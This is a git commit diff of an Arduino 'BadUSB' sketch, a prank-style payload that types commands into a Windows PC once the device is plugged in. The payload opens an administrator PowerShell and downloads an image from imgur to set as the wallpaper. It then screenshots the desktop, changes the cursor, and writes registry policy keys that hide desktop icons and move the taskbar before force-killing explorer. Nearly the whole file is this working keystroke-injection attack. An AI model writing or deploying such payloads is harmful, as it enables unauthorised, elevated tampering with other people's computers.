5f9175fe2910490d231c9c6b9f8437812f7dcbf4
onomastus <68511040+onomastus@users.noreply.github.com>
2020-08-30 11:42:05 +0200

    Update and rename wallpaper.ino to badusb.ino

--- bad-usb/badusb.ino
+++ bad-usb/badusb.ino
@@ -31,7 +31,7 @@ void powershellAdmin(){
   delay(500);  
 }
 
-  // Hit return key with delays to let slow PC process
+  // Hit return key with delays to let slower PC process
 void enter(){
   delay(250);
   typeKey(KEY_RETURN);
@@ -47,6 +47,7 @@ void repeatKeys(int number,int keyRepeat){
 void setup()
 {
 
+  // If the button is pressed, payload doesn't start
   pinMode(3, INPUT_PULLUP);
   if (digitalRead(3) == LOW){
     while(1);
@@ -61,29 +62,22 @@ void setup()
   winKey(100);
 
   // Use this for keyboards with different layouts
-  winKey(114);
+  // winKey(114);
   // This is for an AZERTY layout keyboard :
-  Keyboard.print("pozershell<exe Set6ZinUserLqnguqgeList 6LqnguqgeList en6US");
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(750);
-  typeKey(KEY_RETURN);
-  delay(250);
+  // Keyboard.print("pozershell<exe Set6ZinUserLqnguqgeList 6LqnguqgeList en6US");
+  // enter();
+  // enter();
 
   powershellAdmin();
-  
-  Keyboard.print("New-Item -Path C:\\ -Name pond -ItemType Directory");
+  Keyboard.print("New-Item -Path C:\\ -Name pond -ItemType Directory"); //Creating a directory to store resources and backups
   enter();
-  
   Keyboard.print("Invoke-WebRequest https://i.imgur.com/bHp57l8.jpg -OutFile C:\\pond\\wallpaper.jpg");
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(2000);
+  enter();
+  delay(2000); // Additional delay if target has slow download speed
 
   Keyboard.print("cd C:\\pond ; mspaint wallpaper.jpg ; exit");
-  delay(250);
-  typeKey(KEY_RETURN);
-  delay(2000);
+  enter();
+  delay(2000); // Delay to open mspaint
 
   // Copy the image, in case Windows version isn't recent enough for the screenshot part to work
   Keyboard.press(KEY_LEFT_CTRL);
@@ -93,7 +87,9 @@ void setup()
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(99);
   Keyboard.releaseAll();
+  delay(100);
 
+  // Set image as background
   typeKey(KEY_LEFT_ALT);
   typeKey(102);
   typeKey(98);
@@ -101,7 +97,6 @@ void setup()
 
   // Windows + D to show desktop
   winKey(100);
-
 
   // Take a screenshot
   Keyboard.press(KEY_LEFT_SHIFT);
@@ -129,6 +124,7 @@ void setup()
   typeKey(KEY_RETURN);
   delay(250);
 
+  // Closing paint
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_F4);
   Keyboard.releaseAll();
@@ -141,7 +137,7 @@ void setup()
   typeKey(KEY_RETURN);
   delay(500);
 
-  // Set cursor to "Busy"
+  // Set cursor to "Unavailable"
   Keyboard.press(KEY_LEFT_SHIFT);
   Keyboard.press(KEY_TAB);
   Keyboard.releaseAll();
@@ -153,31 +149,24 @@ void setup()
   typeKey(KEY_RETURN);
   typeKey(KEY_TAB);
   typeKey(KEY_RETURN);
-
   
   // Removing icons and setting taskbar to auto hide on top
-  
   powershellAdmin(); 
-
   Keyboard.print("reg export HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer C:\\pond\\explorerPolicies.reg");  
   enter();
-  
   Keyboard.print("New-Item -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Policies -Name Explorer -Force");
   enter();
-  
   Keyboard.print("New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer -Name NoDesktop -PropertyType Dword -Value 1 -Force");
   enter();
-  
   Keyboard.print("reg export HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3\\ C:\\pond\\stuckrects3.reg");
   enter();
-  
   Keyboard.print("Set-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Explorer/StuckRects3 -Name Settings -Value ([byte[]](0x30,0x00,0x00,0x00,0xFE,0xFF,0xFF,0xFF,0x03,0x10,0x00,0x00,0x01,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x38,0x04,0x00,0x00,0x78,0x00,0x00,0x00,0x01,0x00,0x00,0x00))");
   enter();
-
   Keyboard.print("Stop-Process -Name explorer -Force ; exit");
   enter();
   
   // End Payload
+
   Keyboard.end();
 }
 
